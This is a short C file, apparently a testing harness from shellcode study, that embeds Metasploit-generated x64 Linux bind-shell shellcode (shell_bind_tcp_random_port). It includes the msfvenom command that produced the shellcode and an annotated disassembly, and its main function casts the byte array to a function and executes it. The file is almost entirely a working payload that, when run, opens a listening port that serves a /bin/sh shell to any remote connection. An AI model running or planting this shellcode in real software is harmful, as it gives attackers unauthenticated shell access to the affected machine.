/*
  This is the msfvnom shellcode for the payload linux/x64/shell_bind_tcp_random_port

  Generated with command:
        msfvenom -p linux/x64/shell_bind_tcp_random_port -f c
*/

/*
0000000000004060 <code>:
    4060:	48 31 f6             	xor    rsi,rsi
    4063:	48 f7 e6             	mul    rsi
    4066:	ff c6                	inc    esi
    4068:	6a 02                	push   0x2
    406a:	5f                   	pop    rdi
    406b:	b0 29                	mov    al,0x29
    406d:	0f 05                	syscall 
    406f:	52                   	push   rdx
    4070:	5e                   	pop    rsi
    4071:	50                   	push   rax
    4072:	5f                   	pop    rdi
    4073:	b0 32                	mov    al,0x32
    4075:	0f 05                	syscall 
    4077:	b0 2b                	mov    al,0x2b
    4079:	0f 05                	syscall 
    407b:	57                   	push   rdi
    407c:	5e                   	pop    rsi
    407d:	48 97                	xchg   rdi,rax
    407f:	ff ce                	dec    esi
    4081:	b0 21                	mov    al,0x21
    4083:	0f 05                	syscall 
    4085:	75 f8                	jne    407f <code+0x1f>
    4087:	52                   	push   rdx
    4088:	48 bf 2f 2f 62 69 6e 	movabs rdi,0x68732f6e69622f2f
    408f:	2f 73 68 
    4092:	57                   	push   rdi
    4093:	54                   	push   rsp
    4094:	5f                   	pop    rdi
    4095:	b0 3b                	mov    al,0x3b
    4097:	0f 05                	syscall 
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";

void main()
{
	printf("ShellCode Lenght: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
